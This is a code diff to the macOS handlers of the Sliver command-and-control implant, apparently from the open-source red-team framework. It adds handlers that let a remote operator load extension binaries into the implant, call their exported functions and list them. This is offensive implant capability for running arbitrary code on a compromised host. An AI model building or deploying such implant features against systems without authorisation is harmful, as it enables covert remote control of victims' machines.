@@ -19,8 +19,11 @@ package handlers
 */
 
 import (
+	"github.com/bishopfox/sliver/implant/sliver/extension"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 )
 
 var (
@@ -50,6 +53,11 @@ var (
 		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
 		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,
 
+		// Extensions
+		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
+		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
+		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,
+
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
 		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
@@ -72,4 +80,67 @@ func GetSystemHandlers() map[uint32]RPCHandler {
 // GetSystemPivotHandlers - Returns a map of the darwin system handlers
 func GetSystemPivotHandlers() map[uint32]PivotHandler {
 	return darwinPivotHandlers
+}
+
+// Extensions
+
+func registerExtensionHandler(data []byte, resp RPCResponse) {
+	registerReq := &sliverpb.RegisterExtensionReq{}
+
+	err := proto.Unmarshal(data, registerReq)
+	if err != nil {
+		return
+	}
+
+	ext := extension.NewDarwinExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
+	extension.Add(ext)
+	err = ext.Load()
+	registerResp := &sliverpb.RegisterExtension{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		registerResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(registerResp)
+	resp(data, err)
+}
+
+func callExtensionHandler(data []byte, resp RPCResponse) {
+	callReq := &sliverpb.CallExtensionReq{}
+
+	err := proto.Unmarshal(data, callReq)
+	if err != nil {
+		return
+	}
+
+	callResp := &sliverpb.CallExtension{
+		Response: &commonpb.Response{},
+	}
+	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
+		callResp.Output = out
+		data, err = proto.Marshal(callResp)
+		resp(data, err)
+	})
+	// Only send back synchronously if there was an error
+	if err != nil {
+		callResp.Response.Err = err.Error()
+		data, err = proto.Marshal(callResp)
+		resp(data, err)
+	}
+}
+
+func listExtensionsHandler(data []byte, resp RPCResponse) {
+	lstReq := &sliverpb.ListExtensionsReq{}
+	err := proto.Unmarshal(data, lstReq)
+	if err != nil {
+		return
+	}
+
+	exts := extension.List()
+	lstResp := &sliverpb.ListExtensions{
+		Response: &commonpb.Response{},
+		Names:    exts,
+	}
+	data, err = proto.Marshal(lstResp)
+	resp(data, err)
 }
